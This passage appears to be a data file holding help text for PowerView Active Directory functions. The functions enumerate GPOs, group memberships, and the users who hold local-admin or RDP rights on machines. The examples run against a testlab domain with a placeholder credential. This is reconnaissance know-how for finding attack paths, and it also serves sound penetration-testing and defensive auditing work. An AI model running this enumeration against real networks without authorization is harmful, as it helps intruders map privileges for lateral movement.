                  'Wildcards accepted.\n'
                  '\n'
                  '.PARAMETER ComputerIdentity\n'
                  '\n'
                  'Return all GPO objects applied to a given computer identity '
                  '(name, dnsname, DistinguishedName, etc.).\n'
                  '\n'
                  '.PARAMETER UserIdentity\n'
                  '\n'
                  'Return all GPO objects applied to a given user identity '
                  '(name, SID, DistinguishedName, etc.).\n'
                  '\n'
                  '.PARAMETER Domain\n'
                  '\n'
                  'Specifies the domain to use for the query, defaults to the '
                  'current domain.\n'
                  '\n'
                  '.PARAMETER LDAPFilter\n'
                  '\n'
                  'Specifies an LDAP query string that is used to filter '
                  'Active Directory objects.\n'
                  '\n'
                  '.PARAMETER Properties\n'
                  '\n'
                  'Specifies the properties of the output object to retrieve '
                  'from the server.\n'
                  '\n'
                  '.PARAMETER SearchBase\n'
                  '\n'
                  'The LDAP source to search through, e.g. '
                  '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                  'Useful for OU queries.\n'
                  '\n'
                  '.PARAMETER Server\n'
                  '\n'
                  'Specifies an Active Directory server (domain controller) to '
                  'bind to.\n'
                  '\n'
                  '.PARAMETER SearchScope\n'
                  '\n'
                  'Specifies the scope to search under, Base/OneLevel/Subtree '
                  '(default of Subtree).\n'
                  '\n'
                  '.PARAMETER ResultPageSize\n'
                  '\n'
                  'Specifies the PageSize to set for the LDAP searcher '
                  'object.\n'
                  '\n'
                  '.PARAMETER ServerTimeLimit\n'
                  '\n'
                  'Specifies the maximum amount of time the server spends '
                  'searching. Default of 120 seconds.\n'
                  '\n'
                  '.PARAMETER SecurityMasks\n'
                  '\n'
                  'Specifies an option for examining security information of a '
                  'directory object.\n'
                  "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                  '\n'
                  '.PARAMETER Tombstone\n'
                  '\n'
                  'Switch. Specifies that the searcher should also return '
                  'deleted/tombstoned objects.\n'
                  '\n'
                  '.PARAMETER FindOne\n'
                  '\n'
                  'Only return one result object.\n'
                  '\n'
                  '.PARAMETER Credential\n'
                  '\n'
                  'A [Management.Automation.PSCredential] object of alternate '
                  'credentials\n'
                  'for connection to the target domain.\n'
                  '\n'
                  '.PARAMETER Raw\n'
                  '\n'
                  'Switch. Return raw results instead of translating the '
                  'fields into a custom PSObject.\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  'Get-DomainGPO -Domain testlab.local\n'
                  '\n'
                  'Return all GPOs for the testlab.local domain\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  'Get-DomainGPO -ComputerName windows1.testlab.local\n'
                  '\n'
                  'Returns all GPOs applied windows1.testlab.local\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  '"{F260B76D-55C8-46C5-BEF1-9016DD98E272}","Test GPO" | '
                  'Get-DomainGPO\n'
                  '\n'
                  'Return the GPOs with the name of '
                  '"{F260B76D-55C8-46C5-BEF1-9016DD98E272}" and the display\n'
                  'name of "Test GPO"\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  "Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' "
                  '-Properties samaccountname,lastlogon\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  "$SecPassword = ConvertTo-SecureString 'Password123!' "
                  '-AsPlainText -Force\n'
                  '$Cred = New-Object '
                  "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                  '$SecPassword)\n'
                  'Get-DomainGPO -Credential $Cred\n'
                  '\n'
                  '.OUTPUTS\n'
                  '\n'
                  'PowerView.GPO\n'
                  '\n'
                  'Custom PSObject with translated GPO property fields.\n'
                  '\n'
                  'PowerView.GPO.Raw\n'
                  '\n'
                  'The raw DirectoryServices.SearchResult object, if -Raw is '
                  'enabled.\n',
 'Get-DomainGPOComputerLocalGroupMapping': '.SYNOPSIS\n'
                                           '\n'
                                           'Takes a computer (or GPO) object '
                                           'and determines what users/groups '
                                           'are in the specified\n'
                                           'local group for the machine '
                                           'through GPO correlation.\n'
                                           '\n'
                                           'Author: @harmj0y  \n'
                                           'License: BSD 3-Clause  \n'
                                           'Required Dependencies: '
                                           'Get-DomainComputer, Get-DomainOU, '
                                           'Get-NetComputerSiteName, '
                                           'Get-DomainSite, '
                                           'Get-DomainGPOLocalGroup  \n'
                                           '\n'
                                           '.DESCRIPTION\n'
                                           '\n'
                                           'This function is the inverse of '
                                           'Get-DomainGPOUserLocalGroupMapping, '
                                           'and finds what users/groups\n'
                                           'are in the specified local group '
                                           'for a target machine through GPO '
                                           'correlation.\n'
                                           '\n'
                                           'If a -ComputerIdentity is '
                                           'specified, retrieve the complete '
                                           'computer object, attempt to\n'
                                           'determine the OU the computer is a '
                                           'part of. Then resolve the '
                                           "computer's site name with\n"
                                           'Get-NetComputerSiteName and '
                                           'retrieve all sites object '
                                           'Get-DomainSite. For those results, '
                                           'attempt to\n'
                                           'enumerate all linked GPOs and '
                                           'associated local group settings '
                                           'with Get-DomainGPOLocalGroup. For\n'
                                           'each resulting GPO group, resolve '
                                           'the resulting user/group name to a '
                                           'full AD object and\n'
                                           'return the results. This will '
                                           'return the domain objects that are '
                                           'members of the specified\n'
                                           '-LocalGroup for the given '
                                           'computer.\n'
                                           '\n'
                                           'Otherwise, if -OUIdentity is '
                                           'supplied, the same process is '
                                           'executed to find linked GPOs and\n'
                                           'localgroup specifications.\n'
                                           '\n'
                                           '.PARAMETER ComputerIdentity\n'
                                           '\n'
                                           'A SamAccountName (e.g. '
                                           'WINDOWS10$), DistinguishedName '
                                           '(e.g. '
                                           'CN=WINDOWS10,CN=Computers,DC=testlab,DC=local),\n'
                                           'SID (e.g. '
                                           'S-1-5-21-890171859-3433809279-3366196753-1124), '
                                           'GUID (e.g. '
                                           '4f16b6bc-7010-4cbf-b628-f3cfe20f6994),\n'
                                           'or a dns host name (e.g. '
                                           'windows10.testlab.local) for the '
                                           'computer to identity GPO local '
                                           'group mappings for.\n'
                                           '\n'
                                           '.PARAMETER OUIdentity\n'
                                           '\n'
                                           'An OU name (e.g. TestOU), '
                                           'DistinguishedName (e.g. '
                                           'OU=TestOU,DC=testlab,DC=local), '
                                           'or\n'
                                           'GUID (e.g. '
                                           '8a9ba22a-8977-47e6-84ce-8c26af4e1e6a) '
                                           'for the OU to identity GPO local '
                                           'group mappings for.\n'
                                           '\n'
                                           '.PARAMETER LocalGroup\n'
                                           '\n'
                                           'The local group to check access '
                                           'against.\n'
                                           'Can be "Administrators" '
                                           '(S-1-5-32-544), "RDP/Remote '
                                           'Desktop Users" (S-1-5-32-555),\n'
                                           'or a custom local SID. Defaults to '
                                           "local 'Administrators'.\n"
                                           '\n'
                                           '.PARAMETER Domain\n'
                                           '\n'
                                           'Specifies the domain to enumerate '
                                           'GPOs for, defaults to the current '
                                           'domain.\n'
                                           '\n'
                                           '.PARAMETER Server\n'
                                           '\n'
                                           'Specifies an Active Directory '
                                           'server (domain controller) to bind '
                                           'to.\n'
                                           '\n'
                                           '.PARAMETER SearchScope\n'
                                           '\n'
                                           'Specifies the scope to search '
                                           'under, Base/OneLevel/Subtree '
                                           '(default of Subtree).\n'
                                           '\n'
                                           '.PARAMETER ResultPageSize\n'
                                           '\n'
                                           'Specifies the PageSize to set for '
                                           'the LDAP searcher object.\n'
                                           '\n'
                                           '.PARAMETER ServerTimeLimit\n'
                                           '\n'
                                           'Specifies the maximum amount of '
                                           'time the server spends searching. '
                                           'Default of 120 seconds.\n'
                                           '\n'
                                           '.PARAMETER Tombstone\n'
                                           '\n'
                                           'Switch. Specifies that the '
                                           'searcher should also return '
                                           'deleted/tombstoned objects.\n'
                                           '\n'
                                           '.PARAMETER Credential\n'
                                           '\n'
                                           'A '
                                           '[Management.Automation.PSCredential] '
                                           'object of alternate credentials\n'
                                           'for connection to the target '
                                           'domain.\n'
                                           '\n'
                                           '.EXAMPLE\n'
                                           '\n'
                                           'Get-DomainGPOComputerLocalGroupMapping '
                                           '-ComputerName '
                                           'WINDOWS3.testlab.local\n'
                                           '\n'
                                           'Finds users who have local admin '
                                           'rights over WINDOWS3 through GPO '
                                           'correlation.\n'
                                           '\n'
                                           '.EXAMPLE\n'
                                           '\n'
                                           'Get-DomainGPOComputerLocalGroupMapping '
                                           '-Domain dev.testlab.local '
                                           '-ComputerName '
                                           'WINDOWS4.dev.testlab.local '
                                           '-LocalGroup RDP\n'
                                           '\n'
                                           'Finds users who have RDP rights '
                                           'over WINDOWS4 through GPO '
                                           'correlation.\n'
                                           '\n'
                                           '.EXAMPLE\n'
                                           '\n'
                                           '$SecPassword = '
                                           'ConvertTo-SecureString '
                                           "'Password123!' -AsPlainText "
                                           '-Force\n'
                                           '$Cred = New-Object '
                                           "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                                           '$SecPassword)\n'
                                           'Get-DomainGPOComputerLocalGroupMapping '
                                           '-Credential $Cred '
                                           '-ComputerIdentity '
                                           'SQL.testlab.local\n'
                                           '\n'
                                           '.OUTPUTS\n'
                                           '\n'
                                           'PowerView.GGPOComputerLocalGroupMember\n',
 'Get-DomainGPOLocalGroup': '.SYNOPSIS\n'
                            '\n'
                            'Returns all GPOs in a domain that modify local '
                            "group memberships through 'Restricted Groups'\n"
                            'or Group Policy preferences. Also return their '
                            'user membership mappings, if they exist.\n'
                            '\n'
                            'Author: @harmj0y  \n'
                            'License: BSD 3-Clause  \n'
                            'Required Dependencies: Get-DomainGPO, '
                            'Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, '
                            'ConvertFrom-SID  \n'
                            '\n'
                            '.DESCRIPTION\n'
                            '\n'
                            'First enumerates all GPOs in the current/target '
                            'domain using Get-DomainGPO with passed\n'
                            "arguments, and for each GPO checks if 'Restricted "
                            "Groups' are set with GptTmpl.inf or\n"
                            'group membership is set through Group Policy '
                            'Preferences groups.xml files. For any\n'
                            'GptTmpl.inf files found, the file is parsed with '
                            "Get-GptTmpl and any 'Group Membership'\n"
                            'section data is processed if present. Any found '
                            'Groups.xml files are parsed with\n'
                            'Get-GroupsXML and those memberships are returned '
                            'as well.\n'
                            '\n'
                            '.PARAMETER Identity\n'
                            '\n'
                            "A display name (e.g. 'Test GPO'), "
                            'DistinguishedName (e.g. '
                            "'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),\n"
                            'GUID (e.g. '
                            "'10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO "
                            'name (e.g. '
                            "'{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). "
                            'Wildcards accepted.\n'
                            '\n'
                            '.PARAMETER ResolveMembersToSIDs\n'
                            '\n'
                            'Switch. Indicates that any member names should be '
                            'resolved to their domain SIDs.\n'
                            '\n'
                            '.PARAMETER Domain\n'
                            '\n'
                            'Specifies the domain to use for the query, '
                            'defaults to the current domain.\n'
                            '\n'
                            '.PARAMETER LDAPFilter\n'
                            '\n'
                            'Specifies an LDAP query string that is used to '
                            'filter Active Directory objects.\n'
                            '\n'
                            '.PARAMETER SearchBase\n'
                            '\n'
                            'The LDAP source to search through, e.g. '
                            '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                            'Useful for OU queries.\n'
                            '\n'
                            '.PARAMETER Server\n'
                            '\n'
                            'Specifies an Active Directory server (domain '
                            'controller) to bind to.\n'
                            '\n'
                            '.PARAMETER SearchScope\n'
                            '\n'
                            'Specifies the scope to search under, '
                            'Base/OneLevel/Subtree (default of Subtree).\n'
                            '\n'
                            '.PARAMETER ResultPageSize\n'
                            '\n'
                            'Specifies the PageSize to set for the LDAP '
                            'searcher object.\n'
                            '\n'
                            '.PARAMETER ServerTimeLimit\n'
                            '\n'
                            'Specifies the maximum amount of time the server '
                            'spends searching. Default of 120 seconds.\n'
                            '\n'
                            '.PARAMETER Tombstone\n'
                            '\n'
                            'Switch. Specifies that the searcher should also '
                            'return deleted/tombstoned objects.\n'
                            '\n'
                            '.PARAMETER Credential\n'
                            '\n'
                            'A [Management.Automation.PSCredential] object of '
                            'alternate credentials\n'
                            'for connection to the target domain.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-DomainGPOLocalGroup\n'
                            '\n'
                            'Returns all local groups set by GPO along with '
                            'their members and memberof.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            'Get-DomainGPOLocalGroup -ResolveMembersToSIDs\n'
                            '\n'
                            'Returns all local groups set by GPO along with '
                            'their members and memberof,\n'
                            'and resolve any members to their domain SIDs.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            "'{0847C615-6C4E-4D45-A064-6001040CC21C}' | "
                            'Get-DomainGPOLocalGroup\n'
                            '\n'
                            'Return any GPO-set groups for the GPO with the '
                            'given name/GUID.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            "Get-DomainGPOLocalGroup 'Desktops'\n"
                            '\n'
                            'Return any GPO-set groups for the GPO with the '
                            'given display name.\n'
                            '\n'
                            '.EXAMPLE\n'
                            '\n'
                            '$SecPassword = ConvertTo-SecureString '
                            "'Password123!' -AsPlainText -Force\n"
                            '$Cred = New-Object '
                            "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                            '$SecPassword)\n'
                            'Get-DomainGPOLocalGroup -Credential $Cred\n'
                            '\n'
                            '.LINK\n'
                            '\n'
                            'https://morgansimonsenblog.azurewebsites.net/tag/groups/\n',
 'Get-DomainGPOUserLocalGroupMapping': '.SYNOPSIS\n'
                                       '\n'
                                       'Enumerates the machines where a '
                                       'specific domain user/group is a member '
                                       'of a specific\n'
                                       'local group, all through GPO '
                                       'correlation. If no user/group is '
                                       'specified, all\n'
                                       'discoverable mappings are returned.\n'
                                       '\n'
                                       'Author: @harmj0y  \n'
                                       'License: BSD 3-Clause  \n'
                                       'Required Dependencies: '
                                       'Get-DomainGPOLocalGroup, '
                                       'Get-DomainObject, Get-DomainComputer, '
                                       'Get-DomainOU, Get-DomainSite, '
                                       'Get-DomainGroup  \n'
                                       '\n'
                                       '.DESCRIPTION\n'
                                       '\n'
                                       'Takes a user/group name and optional '
                                       'domain, and determines the computers '
                                       'in the domain\n'
                                       'the user/group has local admin (or '
                                       'RDP) rights to.\n'
                                       '\n'
                                       'It does this by:\n'
                                       '    1.  resolving the user/group to '
                                       'its proper SID\n'
                                       '    2.  enumerating all groups the '
                                       'user/group is a current part of\n'
                                       '        and extracting all target SIDs '
                                       'to build a target SID list\n'
                                       '    3.  pulling all GPOs that set '
                                       "'Restricted Groups' or Groups.xml by "
                                       'calling\n'
                                       '        Get-DomainGPOLocalGroup\n'
                                       '    4.  matching the target SID list '
                                       'to the queried GPO SID list\n'
                                       '        to enumerate all GPO the user '
                                       'is effectively applied with\n'
                                       '    5.  enumerating all OUs and sites '
                                       'and applicable GPO GUIs are\n'
                                       '        applied to through gplink '
                                       'enumerating\n'
                                       '    6.  querying for all computers '
                                       'under the given OUs or sites\n'
                                       '\n'
                                       'If no user/group is specified, all '
                                       'user/group -> machine mappings '
                                       'discovered through\n'
                                       'GPO relationships are returned.\n'
                                       '\n'
                                       '.PARAMETER Identity\n'
                                       '\n'
                                       'A SamAccountName (e.g. harmj0y), '
                                       'DistinguishedName (e.g. '
                                       'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                                       'SID (e.g. '
                                       'S-1-5-21-890171859-3433809279-3366196753-1108), '
                                       'or GUID (e.g. '
                                       '4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                                       'for the user/group to identity GPO '
                                       'local group mappings for.\n'
                                       '\n'
                                       '.PARAMETER LocalGroup\n'
                                       '\n'
                                       'The local group to check access '
                                       'against.\n'
                                       'Can be "Administrators" '
                                       '(S-1-5-32-544), "RDP/Remote Desktop '
                                       'Users" (S-1-5-32-555),\n'
                                       'or a custom local SID. Defaults to '
                                       "local 'Administrators'.\n"
                                       '\n'
                                       '.PARAMETER Domain\n'
                                       '\n'
                                       'Specifies the domain to enumerate GPOs '
                                       'for, defaults to the current domain.\n'
                                       '\n'
                                       '.PARAMETER Server\n'
                                       '\n'
                                       'Specifies an Active Directory server '
                                       '(domain controller) to bind to.\n'
                                       '\n'
                                       '.PARAMETER SearchScope\n'
                                       '\n'
                                       'Specifies the scope to search under, '
                                       'Base/OneLevel/Subtree (default of '
                                       'Subtree).\n'
                                       '\n'
                                       '.PARAMETER ResultPageSize\n'
                                       '\n'
                                       'Specifies the PageSize to set for the '
                                       'LDAP searcher object.\n'
                                       '\n'
                                       '.PARAMETER ServerTimeLimit\n'
                                       '\n'
                                       'Specifies the maximum amount of time '
                                       'the server spends searching. Default '
                                       'of 120 seconds.\n'
                                       '\n'
                                       '.PARAMETER Tombstone\n'
                                       '\n'
                                       'Switch. Specifies that the searcher '
                                       'should also return deleted/tombstoned '
                                       'objects.\n'
                                       '\n'
                                       '.PARAMETER Credential\n'
                                       '\n'
                                       'A [Management.Automation.PSCredential] '
                                       'object of alternate credentials\n'
                                       'for connection to the target domain.\n'
                                       '\n'
                                       '.EXAMPLE\n'
                                       '\n'
                                       'Get-DomainGPOUserLocalGroupMapping\n'
                                       '\n'
                                       'Find all user/group -> machine '
                                       'relationships where the user/group is '
                                       'a member\n'
                                       'of the local administrators group on '
                                       'target machines.\n'
                                       '\n'
                                       '.EXAMPLE\n'
                                       '\n'
                                       'Get-DomainGPOUserLocalGroupMapping '
                                       '-Identity dfm -Domain '
                                       'dev.testlab.local\n'
                                       '\n'
                                       'Find all computers that dfm user has '
                                       'local administrator rights to in\n'
                                       'the dev.testlab.local domain.\n'
                                       '\n'
                                       '.EXAMPLE\n'
                                       '\n'
                                       '$SecPassword = ConvertTo-SecureString '
                                       "'Password123!' -AsPlainText -Force\n"
                                       '$Cred = New-Object '
                                       "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                                       '$SecPassword)\n'
                                       'Get-DomainGPOUserLocalGroupMapping '
                                       '-Credential $Cred\n'
                                       '\n'
                                       '.OUTPUTS\n'
                                       '\n'
                                       'PowerView.GPOLocalGroupMapping\n'
                                       '\n'
                                       'A custom PSObject containing any '
                                       'target identity information and what '
                                       'local\n'
                                       "group memberships they're a part of "
                                       'through GPO correlation.\n'
                                       '\n'
                                       '.LINK\n'
                                       '\n'
                                       'http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/\n',
 'Get-DomainGUIDMap': '.SYNOPSIS\n'
                      '\n'
                      'Helper to build a hash table of [GUID] -> resolved '
                      'names for the current or specified Domain.\n'
                      '\n'
                      'Author: Will Schroeder (@harmj0y)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: Get-DomainSearcher, '
                      'Get-Forest  \n'
                      '\n'
                      '.DESCRIPTION\n'
                      '\n'
                      'Searches the forest schema location '
                      '(CN=Schema,CN=Configuration,DC=testlab,DC=local) for\n'
                      'all objects with schemaIDGUID set and translates the '
                      'GUIDs discovered to human-readable names.\n'
                      'Then searches the extended rights location '
                      '(CN=Extended-Rights,CN=Configuration,DC=testlab,DC=local)\n'
                      'for objects where objectClass=controlAccessRight, '
                      'translating the GUIDs again.\n'
                      '\n'
                      'Heavily adapted from '
                      'http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx\n'
                      '\n'
                      '.PARAMETER Domain\n'
                      '\n'
                      'Specifies the domain to use for the query, defaults to '
                      'the current domain.\n'
                      '\n'
                      '.PARAMETER Server\n'
                      '\n'
                      'Specifies an Active Directory server (domain '
                      'controller) to bind to.\n'
                      '\n'
                      '.PARAMETER ResultPageSize\n'
                      '\n'
                      'Specifies the PageSize to set for the LDAP searcher '
                      'object.\n'
                      '\n'
                      '.PARAMETER ServerTimeLimit\n'
                      '\n'
                      'Specifies the maximum amount of time the server spends '
                      'searching. Default of 120 seconds.\n'
                      '\n'
                      '.PARAMETER Credential\n'
                      '\n'
                      'A [Management.Automation.PSCredential] object of '
                      'alternate credentials\n'
                      'for connection to the target domain.\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'Hashtable\n'
                      '\n'
                      'Ouputs a hashtable containing a GUID -> Readable Name '
                      'mapping.\n'
                      '\n'
                      '.LINK\n'
                      '\n'
                      'http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx\n',
 'Get-DomainGroup': '.SYNOPSIS\n'
                    '\n'
                    'Return all groups or specific group objects in AD.\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: Get-DomainSearcher, '
                    'Get-DomainObject, Convert-ADName, Convert-LDAPProperty  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'Builds a directory searcher object using '
                    'Get-DomainSearcher, builds a custom\n'
                    'LDAP filter based on targeting/filter parameters, and '
                    'searches for all objects\n'
                    'matching the criteria. To only return specific '
                    'properties, use\n'
                    '"-Properties samaccountname,usnchanged,...". By default, '
                    'all group objects for\n'
                    'the current domain are returned. To return the groups a '
                    'specific user/group is\n'
                    'a part of, use -MemberIdentity X to execute token groups '
                    'enumeration.\n'
                    '\n'
                    '.PARAMETER Identity\n'
                    '\n'
                    'A SamAccountName (e.g. Group1), DistinguishedName (e.g. '
                    'CN=group1,CN=Users,DC=testlab,DC=local),\n'
                    'SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), '
                    'or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\n'
                    'specifying the group to query for. Wildcards accepted.\n'
                    '\n'
                    '.PARAMETER MemberIdentity\n'
                    '\n'
                    'A SamAccountName (e.g. Group1), DistinguishedName (e.g. '
                    'CN=group1,CN=Users,DC=testlab,DC=local),\n'
                    'SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), '
                    'or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\n'
                    'specifying the user/group member to query for group '
                    'membership.\n'
                    '\n'
                    '.PARAMETER AdminCount\n'
                    '\n'
                    "Switch. Return users with '(adminCount=1)' (meaning "
                    'are/were privileged).\n'
                    '\n'
                    '.PARAMETER GroupScope\n'
                    '\n'
                    'Specifies the scope (DomainLocal, Global, or Universal) '
                    'of the group(s) to search for.\n'
                    'Also accepts NotDomainLocal, NotGloba, and NotUniversal '
                    'as negations.\n'
                    '\n'
                    '.PARAMETER GroupProperty\n'
                    '\n'
                    'Specifies a specific property to search for when '
                    'performing the group search.\n'
                    'Possible values are Security, Distribution, '
                    'CreatedBySystem, and NotCreatedBySystem.\n'
                    '\n'
                    '.PARAMETER Domain\n'
                    '\n'
                    'Specifies the domain to use for the query, defaults to '
                    'the current domain.\n'
                    '\n'
                    '.PARAMETER LDAPFilter\n'
                    '\n'
                    'Specifies an LDAP query string that is used to filter '
                    'Active Directory objects.\n'
                    '\n'
                    '.PARAMETER Properties\n'
                    '\n'
                    'Specifies the properties of the output object to retrieve '
                    'from the server.\n'
                    '\n'
                    '.PARAMETER SearchBase\n'
                    '\n'
                    'The LDAP source to search through, e.g. '
                    '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                    'Useful for OU queries.\n'
                    '\n'
                    '.PARAMETER Server\n'
                    '\n'
                    'Specifies an Active Directory server (domain controller) '
                    'to bind to.\n'
                    '\n'
                    '.PARAMETER SearchScope\n'
                    '\n'
                    'Specifies the scope to search under, '
                    'Base/OneLevel/Subtree (default of Subtree).\n'
                    '\n'
                    '.PARAMETER ResultPageSize\n'
                    '\n'
                    'Specifies the PageSize to set for the LDAP searcher '
                    'object.\n'
                    '\n'
                    '.PARAMETER ServerTimeLimit\n'
                    '\n'
                    'Specifies the maximum amount of time the server spends '
                    'searching. Default of 120 seconds.\n'
                    '\n'
                    '.PARAMETER SecurityMasks\n'
                    '\n'
                    'Specifies an option for examining security information of '
                    'a directory object.\n'
                    "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                    '\n'
                    '.PARAMETER Tombstone\n'
                    '\n'
                    'Switch. Specifies that the searcher should also return '
                    'deleted/tombstoned objects.\n'
                    '\n'
                    '.PARAMETER FindOne\n'
                    '\n'
                    'Only return one result object.\n'
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'A [Management.Automation.PSCredential] object of '
                    'alternate credentials\n'
                    'for connection to the target domain.\n'
                    '\n'
                    '.PARAMETER Raw\n'
                    '\n'
                    'Switch. Return raw results instead of translating the '
                    'fields into a custom PSObject.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainGroup | select samaccountname\n'
                    '\n'
                    'samaccountname\n'
                    '--------------\n'
                    'WinRMRemoteWMIUsers__\n'
                    'Administrators\n'
                    'Users\n'
                    'Guests\n'
                    'Print Operators\n'
                    'Backup Operators\n'
                    '...\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainGroup *admin* | select distinguishedname\n'
                    '\n'
                    'distinguishedname\n'
                    '-----------------\n'
                    'CN=Administrators,CN=Builtin,DC=testlab,DC=local\n'
                    'CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local\n'
                    'CN=Schema Admins,CN=Users,DC=testlab,DC=local\n'
                    'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local\n'
                    'CN=Domain Admins,CN=Users,DC=testlab,DC=local\n'
                    'CN=DnsAdmins,CN=Users,DC=testlab,DC=local\n'
                    'CN=Server Admins,CN=Users,DC=testlab,DC=local\n'
                    'CN=Desktop Admins,CN=Users,DC=testlab,DC=local\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-DomainGroup -Properties samaccountname -Identity '
                    "'S-1-5-21-890171859-3433809279-3366196753-1117' | fl\n"
                    '\n'
                    'samaccountname\n'
                    '--------------\n'
                    'Server Admins\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | "
                    'Get-DomainGroup -Server primary.testlab.local -Verbose\n'
                    'VERBOSE: Get-DomainSearcher search string: '
                    'LDAP://DC=testlab,DC=local\n'
                    'VERBOSE: Get-DomainGroup filter string: '
                    '(&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))\n'
                    '\n'
                    'usncreated            : 13245\n'
                    'grouptype             : -2147483646\n'
                    'samaccounttype        : 268435456\n'
                    'samaccountname        : Desktop Admins\n'
                    'whenchanged           : 8/10/2016 12:30:30 AM\n'
                    'objectsid             : '
                    'S-1-5-21-890171859-3433809279-3366196753-1118\n'
                    'objectclass           : {top, group}\n'
                    'cn                    : Desktop Admins\n'
                    'usnchanged            : 13255\n'
                    'dscorepropagationdata : 1/1/1601 12:00:00 AM\n'
                    'name                  : Desktop Admins\n'
                    'distinguishedname     : CN=Desktop '
                    'Admins,CN=Users,DC=testlab,DC=local\n'
                    'member                : CN=Andy Robbins '
                    '(admin),CN=Users,DC=testlab,DC=local\n'
                    'whencreated           : 8/10/2016 12:29:43 AM\n'
                    'instancetype          : 4\n'
                    'objectguid            : '
                    'f37903ed-b333-49f4-abaa-46c65e9cca71\n'
                    'objectcategory        : '
                    'CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                    '$SecPassword)\n'
                    'Get-DomainGroup -Credential $Cred\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'Get-Domain | Select-Object -Expand name\n'
                    'testlab.local\n'
                    '\n'
                    "'DEV\\Domain Admins' | Get-DomainGroup -Verbose "
                    '-Properties distinguishedname\n'
                    'VERBOSE: [Get-DomainSearcher] search string: '
                    'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                    'VERBOSE: [Get-DomainGroup] Extracted domain '
                    "'dev.testlab.local' from 'DEV\\Domain Admins'\n"
                    'VERBOSE: [Get-DomainSearcher] search string: '
                    'LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\n'
                    'VERBOSE: [Get-DomainGroup] filter string: '
                    '(&(objectCategory=group)(|(samAccountName=Domain '
                    'Admins)))\n'
                    '\n'
                    'distinguishedname\n'
                    '-----------------\n'
                    'CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'PowerView.Group\n'
                    '\n'
                    'Custom PSObject with translated group property fields.\n',
 'Get-DomainGroupMember': '.SYNOPSIS\n'
                          '\n'
                          'Return the members of a specific domain group.\n'
                          '\n'
                          'Author: Will Schroeder (@harmj0y)  \n'
                          'License: BSD 3-Clause  \n'
                          'Required Dependencies: Get-DomainSearcher, '
                          'Get-DomainGroup, Get-DomainGroupMember, '
                          'Convert-ADName, Get-DomainObject, '
                          'ConvertFrom-SID  \n'
                          '\n'
                          '.DESCRIPTION\n'
                          '\n'
                          'Builds a directory searcher object using '
                          'Get-DomainSearcher, builds a custom\n'
                          'LDAP filter based on targeting/filter parameters, '
                          'and searches for the specified\n'
                          'group matching the criteria. Each result is then '
                          'rebound and the full user\n'
                          'or group object is returned.\n'
                          '\n'
                          '.PARAMETER Identity\n'
                          '\n'
                          'A SamAccountName (e.g. Group1), DistinguishedName '
                          '(e.g. CN=group1,CN=Users,DC=testlab,DC=local),\n'
                          'SID (e.g. '
                          'S-1-5-21-890171859-3433809279-3366196753-1114), or '
                          'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\n'
                          'specifying the group to query for. Wildcards '
                          'accepted.\n'
                          '\n'
                          '.PARAMETER Domain\n'
                          '\n'
                          'Specifies the domain to use for the query, defaults '
